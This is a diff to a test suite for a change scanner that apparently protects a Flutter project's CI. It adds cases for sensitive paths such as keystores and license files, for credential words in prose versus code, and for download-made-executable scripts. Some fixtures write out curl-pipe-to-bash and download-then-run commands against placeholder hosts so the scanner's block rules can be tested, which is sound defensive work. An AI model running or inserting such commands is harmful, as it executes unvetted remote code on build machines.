@@ -307,6 +307,25 @@ class SensitiveSurfaces(ScannerTestCase):
         self.assertSensitive(result)
 
 
+class ProjectConfigPaths(ScannerTestCase):
+    """Cross-checked against flutter-ci-fixer.yml's own forbidden-paths list."""
+
+    def test_analyzer_config(self):
+        """`flutter analyze` is a required check on every PR."""
+        path = "analysis_options.yaml"
+        self.assertSensitive(self.build({path: "linter:\n"}, {path: "linter:\n  rules: []\n"}))
+
+    def test_licensing(self):
+        for path in ("LICENSE", "COPYING", "NOTICE.md"):
+            with self.subTest(path):
+                self.assertSensitive(self.build({path: "a\n"}, {path: "b\n"}))
+
+    def test_signing_material(self):
+        for path in ("android/key.properties", "android/app/release.jks", "upload.keystore"):
+            with self.subTest(path):
+                self.assertSensitive(self.build({}, {path: "x\n"}))
+
+
 class GithubDirectoryPaths(ScannerTestCase):
     """`.github/` is automation by default; only community metadata is exempt."""
 
@@ -483,6 +502,50 @@ class BlockedAdditions(ScannerTestCase):
         result = self.build({}, {"lib/a.dart": f"final run = {PROCESS_RUN};\n"})
         self.assertEqual(result.returncode, 1)
         self.assertIn("an approval does not bypass them", result.report)
+
+
+class ProseIsNotLogic(ScannerTestCase):
+    """The credential words are ordinary English."""
+
+    def test_documentation_prose_is_ordinary(self):
+        """The advertised no-ceremony path has to survive the word 'password'."""
+        for path in ("docs/setup.md", "README.md", "docs/faq.txt"):
+            with self.subTest(path):
+                self.assertOrdinary(
+                    self.build({}, {path: "Enter your password to sign in.\n"})
+                )
+
+    def test_code_still_matches(self):
+        self.assertSensitive(
+            self.build({}, {"lib/feature/x.dart": "final password = read();\n"})
+        )
+
+
+class DownloadMadeExecutable(ScannerTestCase):
+    """chmod is a supply-chain event, but it is not itself execution."""
+
+    URL = "https://example.invalid/tool"
+
+    def test_chmod_without_execution_is_reviewable_not_blocked(self):
+        script = f"#!/bin/sh\ncurl -o /tmp/tool {self.URL} && chmod +x /tmp/tool\n"
+        result = self.build({}, {"packaging/install.sh": script})
+        self.assertFalse(result.blocked, result.report)
+        self.assertTrue(result.sensitive, result.report)
+
+    def test_chmod_then_invocation_is_blocked(self):
+        script = blocked(
+            f"#!/bin/sh\ncurl -o /tmp/tool {self.URL} && chmod +x /tmp/tool\n", "/tmp/tool", "\n"
+        )
+        self.assertBlocked(self.build({}, {"packaging/run.sh": script}))
+
+    def test_path_reappearing_at_line_start_is_not_an_invocation(self):
+        """Without the chmod, a path at line start is just a path."""
+        script = (
+            "#!/bin/sh\n"
+            f"curl -o /tmp/tool {self.URL} && echo done\n"
+            "# /tmp/tool is where it landed\n"
+        )
+        self.assertOrdinary(self.build({}, {"packaging/note.sh": script}))
 
 
 class ShellFlagValues(ScannerTestCase):
@@ -1282,8 +1345,7 @@ class GuardSelfSafety(unittest.TestCase):
 
     def test_every_blocked_rule_matches_its_own_reason_free_fixture(self):
         """Guards against a fragment split that quietly breaks a rule."""
-        matched = set()
-        for fixture in (
+        fixtures = (
             f"{PROCESS_RUN}('sh', [])",
             f"{PROCESS_START}('sh')",
             f"'{RUN_IN_SHELL}': true",
@@ -1293,11 +1355,20 @@ class GuardSelfSafety(unittest.TestCase):
             WRITE_ALL,
             blocked("curl -s https://example.invalid ", "|", " bash"),
             blocked("curl -s https://example.invalid -o /tmp/x && ", "sh", " /tmp/x"),
-        ):
-            for pattern, reason in scanner.BLOCKED_ADDITION_RULES:
-                if pattern.search(fixture):
-                    matched.add(reason)
-        self.assertEqual(len(matched), len(scanner.BLOCKED_ADDITION_RULES))
+            blocked(
+                "curl -s https://example.invalid -o /tmp/x && chmod +x /tmp/x\n",
+                "/tmp/x",
+                "\n",
+            ),
+        )
+        # Indexed, not keyed by reason: two rules share the download-then-execute
+        # reason, and a set of reasons could never account for both.
+        unmatched = [
+            reason
+            for index, (pattern, reason) in enumerate(scanner.BLOCKED_ADDITION_RULES)
+            if not any(pattern.search(fixture) for fixture in fixtures)
+        ]
+        self.assertEqual(unmatched, [], f"rules with no fixture: {unmatched}")
 
 
 class RealRepositoryScanner(unittest.TestCase):
